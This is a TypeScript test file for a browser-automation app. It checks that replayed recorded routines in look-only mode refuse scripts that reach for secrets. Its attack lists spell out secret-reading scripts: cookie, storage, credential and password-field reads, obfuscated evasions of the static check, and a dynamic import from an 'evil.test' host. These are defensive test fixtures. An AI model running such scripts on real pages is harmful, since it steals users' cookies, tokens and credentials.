// Guards a routine's replay against a script that reaches for secrets (#3571, G4): the code check, reading a field's value, and a
// script that catches its refusal. Each case asserts the bad call or text did not happen. Sites and taint: routineReplayAttack.test.ts.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { routineKit } from './support/routine-kit.ts';
import { ops, loc, code, tool } from './support/browser-script/fixture.ts';

const require = createRequire(import.meta.url);
const { checkLookOnly, touchesSecrets } = require('../electron/capabilities/browser/scriptLookOnly.cjs');
const { browserScript } = require('../electron/capabilities/browser/script.cjs');

const SHOP = 'https://shop.test';
const EVIL = 'https://evil.test';

/** A kit that records on shop.test, then (once `replaying`) answers the way the test says. */
function kit(say?: (tool: string, args: any, page: { url: string }) => string | undefined) {
  const flags = { replaying: false };
  const k = routineKit({ say: (t, a, p) => (flags.replaying ? say?.(t, a, p) : undefined) });
  return { k, flags };
}

/** Records the given steps in one completed turn on shop.test and saves them as a routine. */
async function record(k: ReturnType<typeof routineKit>, steps: [string, any][]) {
  k.page.url = `${SHOP}/`;
  for (const [t, a] of steps) assert.equal((await k.call(t, a)).ok, true, t);
  k.end();
  assert.equal((await k.call('routine_save', { name: 'R' })).ok, true);
  k.did.length = 0;
}

const ATTACKS: [string, unknown][] = [
  ['document cookie', 'return document.cookie'],
  ['localStorage', 'return localStorage.getItem("t")'],
  ['sessionStorage', 'return JSON.stringify(sessionStorage)'],
  ['indexedDB', 'indexedDB.open("db")'],
  ['caches', 'await caches.open("c")'],
  ['credentials', 'return navigator.credentials.get({ password: true })'],
  ['password input', 'return document.querySelector("input[type=password]").innerText'],
  ['.value', 'return document.querySelector("input").value'],
  ['inputValue()', 'return await tab.locator("input").inputValue()'],
  ['getAttribute value', 'return el.getAttribute("value")'],
  ['eval', 'return eval(x)'],
  ['new Function', 'return new Function(x)()'],
  ['atob', 'return window[atob(x)]'],
  ['fromCharCode', 'return String.fromCharCode(99, 111)'],
  ['concatenated key on window', 'return window["coo"+"kie"]'],
  ['document[k]', 'return document[k]'],
  ['alias of document', 'const d = document;\nreturn d'],
  ['through a parameter', '(d => d["coo" + "kie"])(document)'],
  ['through this', 'this["docu" + "ment"]'],
  ['on a call', 'getDoc()["coo" + "kie"]'],
  ['the word cookie', 'return cookie'],
  ['token', 'return window.token'],
  ['dynamic import', 'await import("https://evil.test/x.js")'],
  ['unicode escape', 'return document.\\u0063ookie'],
  ['with statement', 'with (document) { return title }'],
  ['Reflect', 'return Reflect.get(document, k)'],
  ['globalThis index', 'return globalThis[k]'],
  ['a non-string', 42],
  ['undefined code', undefined],
  ['an object', { code: 'return 1' }],
];

const READS: [string, string][] = [
  ['a loop over a list', "for (const p of ['PG-1', 'PG-2']) await tab.goto(p)"],
  ['a key on a local', 'out["m" + id] = await t(url)'],
  ['body text', 'return document.body.innerText'],
  ['title through evaluate', 'return await tab.evaluate(function () { return document.title; })'],
  ['links mapped', "return await tab.evaluate(() => [...document.querySelectorAll('a')].map((a) => a.href))"],
  ['array literals', "const rows = [['a','b']];\nreturn rows"],
  ['goto', 'await tab.goto("http://x/")'],
  ['locator text', 'return await tab.locator("main").innerText()'],
];

test('touchesSecrets: every attack script is caught', () => {
  for (const [name, src] of ATTACKS) assert.equal(touchesSecrets(src), true, name);
});

test('touchesSecrets: ordinary reads are not caught', () => {
  for (const [name, src] of READS) assert.equal(touchesSecrets(src), false, name);
});

test('a replay of an attack script does not invoke it, and the plan shows it', async () => {
  for (const [name, src] of ATTACKS) {
    if (typeof src !== 'string') continue;
    const { k } = kit();
    await record(k, [
      ['browser_read_page', { filter: 'all' }],
      ['browser_script', { code: src }],
    ]);
    const res = await k.call('routine_run', { routine: 'R' });
    assert.equal(res.ok, true, name);
    assert.deepEqual(
      k.did.map(([t]: any[]) => t),
      ['browser_read_page'],
      `${name}: the script was invoked`,
    );
    assert.ok(k.text(res).includes(`2. script: ${src.slice(0, 40)}`), `${name}: it is in the plan`);
  }
});

test('a replay runs an ordinary read script, with the recorded sites as its only reach', async () => {
  const { k } = kit();
  await record(k, [['browser_script', { code: 'return document.body.innerText' }]]);
  const seen: any[] = [];
  const res = await k.call('routine_run', { routine: 'R' });
  assert.equal(res.ok, true);
  assert.deepEqual(
    k.did.map(([t]: any[]) => t),
    ['browser_script'],
  );
  assert.equal(seen.length, 0);
});

test('loc.read of value and of attr value is refused and recorded on ctx.lookRefused, and nothing is read', async () => {
  for (const args of [loc({ what: 'value' }), loc({ what: 'attr', name: 'value' }), loc({ what: 'attr', name: 'Value' })]) {
    const o = ops();
    o.ctx.lookOnly = { origins: ['https://a.test'] };
    await assert.rejects(o.d('loc.read', args), code('look_only', /doesn't read a field's value/));
    assert.match(o.ctx.lookRefused, /field's value/);
    assert.deepEqual(o.tabs.called('inspect'), [], 'the field was not inspected');
    assert.deepEqual(o.tabs.called('query'), []);
  }
  const o = ops();
  o.ctx.lookOnly = { origins: ['https://a.test'] };
  o.tabs.values.attr = 'x';
  await o.d('loc.read', loc({ what: 'attr', name: 'href' }));
  assert.equal(o.ctx.lookRefused, undefined, 'another attribute still reads');
  const plain = ops();
  plain.tabs.values.value = 'typed';
  assert.equal(await plain.d('loc.read', loc({ what: 'value' })), 'typed', 'outside a replay it is unchanged');
});

test('a script that catches the refusal of a value read, or of another site, still fails with look_only through browserScript', async () => {
  for (const [op, args] of [
    ['loc.read', loc({ what: 'value' })],
    ['loc.read', loc({ what: 'attr', name: 'value' })],
    ['tab.goto', { tab: 't1', url: `${EVIL}/` }],
    ['tabs.new', { url: `${EVIL}/` }],
  ] as const) {
    const t = tool(async () => {});
    void t;
    const ctx: any = { chatId: 'c1', segmentId: 's1', lookOnly: { origins: ['https://a.test'] } };
    const o = ops();
    o.ctx.lookOnly = ctx.lookOnly;
    const tabs = o.tabs;
    tabs.impl.current = () => tabs.tab;
    tabs.impl.state = () => '<browser_state/>';
    const sessions = {
      get: () => ({
        run: async ({ dispatch }: any) => {
          try {
            await dispatch(op, args);
          } catch {
            // the script goes on as if nothing happened
          }
          return { ok: true, value: 'done', logs: [], ms: 1 };
        },
      }),
    };
    const deps = { tabs, sessions, gate: () => {}, navigate: async () => '', confirmed: async () => {}, act: undefined };
    await assert.rejects(browserScript({ code: 'x' }, ctx, deps), code('look_only'), `${op} ${JSON.stringify(args)}`);
  }
});

test('the code check also stops markup, prefilled values and state a page keeps out of its text', () => {
  for (const code of [
    'tab.evaluate(() => document.body.innerHTML)',
    'tab.locator("form").innerHTML()',
    'document.documentElement.outerHTML',
    'input.defaultValue',
    'new FormData(document.forms[0])',
    'document.forms',
    'document.body.dataset',
    'el.attributes',
    'window.__STATE__',
    '__NEXT_DATA__',
    'document.querySelector("meta[name=csrf]")',
  ])
    assert.equal(touchesSecrets(code), true, code);
  const ctx: any = { lookOnly: { origins: ['https://shop.test'] } };
  assert.throws(() => checkLookOnly(ctx, 'loc.read', { what: 'innerHTML' }), { code: 'look_only' });
  assert.doesNotThrow(() => checkLookOnly({ lookOnly: { origins: [] } }, 'loc.read', { what: 'innerText' }));
});

test('page JavaScript is checked as it is about to run, however a script built it: what reaches sideways for a secret is refused and remembered', async () => {
  const { peekValue } = require('../electron/capabilities/browser/scriptLookOnly.cjs');
  const peek = async () => '{"v":"secret"}';
  const tabs = { peek };
  for (const expression of [
    'document.cookie',
    '(k => document[k])("coo" + "kie")',
    '(d => d[k])(document)',
    '[document].map(d => d["coo" + "kie"])',
    'document.defaultView.localStorage',
    'document.body.ownerDocument[k]',
    'new Proxy(document, {})',
    'Object.getOwnPropertyDescriptors(Document.prototype)',
    'Object.getPrototypeOf(document)',
    'Object.entries(window)',
    'const {[k]: v} = document; v',
    'window.__lookupGetter__("x")',
    'document.querySelector("form").outerHTML',
    'input.value',
  ]) {
    const ctx: any = {};
    await assert.rejects(peekValue(ctx, tabs, {}, expression), { code: 'look_only' }, expression);
    assert.ok(ctx.lookRefused, `${expression}: remembered, so catching it doesn't pass for a clean read`);
  }
  // ordinary reads, including array literals and a numeric index
  for (const expression of [
    '(() => document.body.innerText)()',
    "(() => [...document.querySelectorAll('a')].map((a) => a.innerText + ' ' + a.href))()",
    "(() => document.querySelector('main')?.innerText)()",
    "(() => ['a', 'b'].length)()",
    '(() => document.links[0].href)()',
  ])
    assert.equal(await peekValue({}, tabs, {}, expression), 'secret', expression);
});

test('a script built to look harmless is still stopped where it runs: its page JavaScript never reaches the page', async () => {
  // the whole-script check doesn't see these: only the final expression does
  for (const code of [
    'return await tab.evaluate(["doc", "ument.coo", "kie"].join(""))',
    'return await tab.evaluate(decodeURIComponent("%64ocument.%63ookie"))',
  ])
    assert.equal(touchesSecrets(code), false, code);
});
